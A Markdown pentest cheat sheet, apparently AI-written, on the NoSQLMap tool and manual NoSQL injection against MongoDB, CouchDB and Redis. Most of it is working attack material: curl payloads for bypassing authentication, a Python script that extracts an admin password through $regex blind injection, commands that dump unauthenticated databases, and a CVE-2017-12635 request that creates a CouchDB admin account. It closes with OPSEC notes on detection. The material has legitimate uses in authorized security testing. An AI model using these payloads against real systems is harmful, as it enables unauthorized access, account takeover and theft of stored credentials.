# NoSQLMap

**Tags:** `#nosqlmap` `#nosql` `#mongodb` `#redis` `#injection` `#webattacks` `#database` `#enumeration`

Automated NoSQL injection and exploitation tool. Tests MongoDB, Redis, CouchDB, and other NoSQL backends for injection vulnerabilities in web applications and direct database access. Analogous to SQLMap but for NoSQL — discovers injection points, bypasses authentication, and extracts data.

**Source:** https://github.com/codingo/NoSQLMap
**Install:**
```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap && pip install -r requirements.txt
python3 nosqlmap.py
```

> [!note] **NoSQLMap vs manual NoSQLi** — NoSQLMap handles MongoDB operator injection (`$ne`, `$gt`, `$regex`) and HTTP parameter fuzzing automatically. For simple auth bypass (`{"username": {"$ne": ""}}`), manual testing via Burp is often faster. Use NoSQLMap for comprehensive enumeration once injection is confirmed.

---

## NoSQL Injection Primer

NoSQL injection typically abuses MongoDB query operators sent via JSON or HTTP parameters.

```bash
# Auth bypass — login with any user
# Original: {"username": "admin", "password": "pass"}
# Injected: {"username": {"$ne": ""}, "password": {"$ne": ""}}

# URL parameter injection
# Original: GET /search?user=admin
# Injected: GET /search?user[$ne]=

# Array-based bypass
# user[]=admin&password[$ne]=x
```

**Common MongoDB operators:**
| Operator | Meaning | Injection Use |
|---|---|---|
| `$ne` | Not equal | Bypass equality checks |
| `$gt` | Greater than | Extract data char-by-char |
| `$regex` | Regex match | Enumerate values |
| `$where` | JS expression | RCE in older MongoDB |
| `$exists` | Field exists | Field enumeration |

---

## Running NoSQLMap

NoSQLMap uses an interactive menu:

```bash
python3 nosqlmap.py
```

**Main menu options:**
```
1 - Set options
2 - NoSQL DB Access Attacks       # Direct DB connection attacks
3 - NoSQL Web App Attacks         # HTTP injection attacks
4 - Scan for Anonymous Access     # Check for unauthenticated DBs
x - Exit
```

---

## Web Application Attacks (HTTP)

```bash
# Launch NoSQLMap and select option 3 for web attacks
python3 nosqlmap.py

# Set target URL, then test:
# - PHP array injection
# - JSON injection
# - HTTP header injection
# - Auth bypass
# - Data extraction via $regex enumeration
```

**Manual equivalent — Burp/curl auth bypass:**
```bash
# JSON body injection
curl -s -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# URL parameter injection
curl -s "http://target.com/search?username[\$ne]=&password[\$ne]="

# Regex-based data extraction — enumerate admin password
curl -s -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": "^a"}}'
# Try each character — success = logged in, fail = 401
```

---

## Direct MongoDB Access

```bash
# Check for unauthenticated MongoDB (port 27017)
mongo --host 192.168.1.10 --port 27017

# NoSQLMap — set DB access options (option 2)
# Set: host, port, DB type = MongoDB
# Then: dump databases, collections, documents
```

**Manual mongosh/mongo commands:**
```javascript
// List databases
show dbs

// Use a database
use admin

// List collections
show collections

// Dump all documents
db.users.find()

// Find with filter
db.users.find({"admin": true})

// Count documents
db.users.countDocuments()

// List all users with passwords
db.users.find({}, {username: 1, password: 1})
```

---

## CouchDB Attacks

```bash
# Check for unauthenticated CouchDB (port 5984)
curl http://192.168.1.10:5984/

# List all databases
curl http://192.168.1.10:5984/_all_dbs

# Dump a database
curl http://192.168.1.10:5984/_users/_all_docs?include_docs=true

# CVE-2017-12635 — create admin user (no auth required on vulnerable versions)
curl -X PUT http://192.168.1.10:5984/_users/org.couchdb.user:hacker \
  -H "Content-Type: application/json" \
  -d '{"type": "user", "name": "hacker", "roles": ["_admin"], "password": "hacker"}'

# Create admin via exploit endpoint
curl -X PUT http://192.168.1.10:5984/_config/admins/hacker -d '"hacker"'
```

---

## Redis via NoSQLMap

NoSQLMap can also target Redis directly — see [redis-cli.md](redis-cli.md) for the full Redis exploitation reference.

```bash
# NoSQLMap option 4 — scan for anonymous access
# Will probe Redis on 6379 automatically
```

---

## Data Extraction — Regex Enumeration

When blind NoSQL injection is confirmed, extract data character by character with `$regex`:

```bash
# Python script — enumerate a field value via regex injection
import requests, string

url = "http://target.com/login"
charset = string.ascii_letters + string.digits + string.punctuation
known = ""

while True:
    found = False
    for c in charset:
        payload = {"username": "admin", "password": {"$regex": f"^{known}{c}"}}
        r = requests.post(url, json=payload)
        if r.status_code == 200 and "welcome" in r.text.lower():
            known += c
            print(f"[+] Found: {known}")
            found = True
            break
    if not found:
        print(f"[*] Complete: {known}")
        break
```

---

## OPSEC Notes

- NoSQLMap sends many probe requests — noisy, will trigger WAF/IDS
- Direct MongoDB/Redis access leaves connection records in DB logs
- MongoDB 4.0+ enables auth by default — older versions (3.x and below) are common unauthenticated finds
- CouchDB "Admin Party" (no admin set) was fixed in 3.x but legacy installs still appear

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
